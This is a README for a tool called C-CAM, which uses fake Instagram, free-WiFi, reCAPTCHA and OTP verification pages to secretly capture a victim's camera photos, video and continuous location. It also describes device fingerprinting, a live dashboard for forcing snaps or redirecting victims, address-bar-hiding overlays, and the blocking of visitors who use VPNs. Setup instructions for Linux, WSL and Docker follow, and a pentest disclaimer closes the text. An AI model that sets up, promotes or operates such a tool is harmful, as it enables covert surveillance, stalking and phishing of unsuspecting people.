# ⚡ C-CAM v2.0 — The Ultimate Upgrade
Grab cam shots, video clips, and high-accuracy continuous locations using beautiful modern templates. Now featuring a real-time web dashboard.

---

## 🌟 New Features (v2.0)
This version is a complete overhaul with advanced attack vectors, detailed monitoring, and enhanced evasion.

*   **🎨 High-Converting Templates (9 total)**: Instagram (Security Checkpoint), Free WiFi (Enterprise Portal), reCAPTCHA Challenge, AI Chatbot Assistant, OTP Verification (3D Secure ID Check).
*   **📸 Advanced Camera Capture**: 1080p high-res, Burst mode (5 rapid shots), continuous Interval lock, Video clip uploads (on modern layouts).
*   **📍 Advanced Tracking & Data Core**: Continuous 30s location tracking updates, Device Fingerprinting (50+ data points), connection Type detection.
*   **🖥️ Real-Time Web Dashboard**: Total views, Photos grid, locations updates intuitively sorted continuously.

---

## 🛡️ Futuristic Upgrades (v3.0)
Advanced control mechanisms and fully immersive transparent layout setups:

*   **🎮 Two-Way Interactive Panel**: Force a Camera Snap 📸 or Redirect 🔗 the victim live directly from Dashboard row buttons triggering continuous frames.
*   **📲 PWA Standard Installation Mode**: Support for `manifest.json` addresses standalone launchers hiding URL address bar browsers fully for 100% cover overlays.
*   **🛑 Automated VPN & Proxy Block Warning**: Prevents site loads if victim is hiding accurate IP nodes coordinates calibration settles up to 20m securely synced.

---

## 🚀 Installation & Setup Guide (Choose Your OS)

### 🔵 1. Linux / Kali / Ubuntu / Termux

Follow these steps to setup and run properly on a raw Linux environment:

**Step 1: Install Setup Dependencies**
Run this in your terminal to install local PHP & netutils:
```bash
sudo apt update
sudo apt install php wget curl unzip -y
```

**Step 2: Install Dashboard WebSocket Support**
To enable Continuous Live updating updates properly loaded:
```bash
sudo apt install python3 python3-pip -y
pip install websockets
```

**Step 3: Run the Tool (Terminal 1)**
Starts the tunnel selection and template setup interface:
```bash
bash c-cam.sh
```

**Step 4: Start Dashboard Companion (Terminal 2)**
Open a **new terminal tab/window** inside the same folder and run:
```bash
python3 c-cam.py --all
```

👉 **Access Dashboard at**: `http://127.0.0.1:3333/dashboard/`

---

### 🟢 2. Windows — Use WSL 🚀 (Strongly Recommended)

Standard CMD or PowerShell is **NOT** supported directly because the core engine relies on Bash routines.

**Step 1: Install WSL (Windows Subsystem for Linux)**
1. Open **PowerShell** (Run as Administrator) and run:
   ```powershell
   wsl --install
   ```
2. Restart your PC if prompted. This creates a fully Ubuntu setup inside.

**Step 2: Open WSL Terminal**
1. Inside **VS Code**, open your Terminal window.
2. From the dropdown next to `+` select **Ubuntu (WSL)** or **Bash**.

**Step 3: Setup & Run**
Run these exact commands in the new WSL tab:
```bash
sudo apt update
sudo apt install php wget curl unzip python3 python3-pip -y
pip install websockets
```

To run the tool (Terminal 1):
```bash
bash c-cam.sh
```

To run the Dashboard (Terminal 2):
```bash
python3 c-cam.py --all
```

👉 **Access Dashboard at**: `http://127.0.0.1:3333/dashboard/`

---

### 🐳 3. Docker setup (The Easiest One - All Platforms)

If you already have **Docker Desktop** installed on Windows/Mac/Linux.

1. Open your simple terminal inside the project folder.
2. Run direct container launch:
```bash
docker-compose up -d
```

No local installation required! This exposes the Dashboard endpoint automatically.

👉 **Access Dashboard immediately at**: `http://127.0.0.1:3333/dashboard/`

---

*⚠️ **Disclaimer**: The author is not responsible for any misuse, illegal operations, or unauthorized data collection. Created strictly for legitimate penetration testing and educational awareness purposes.*
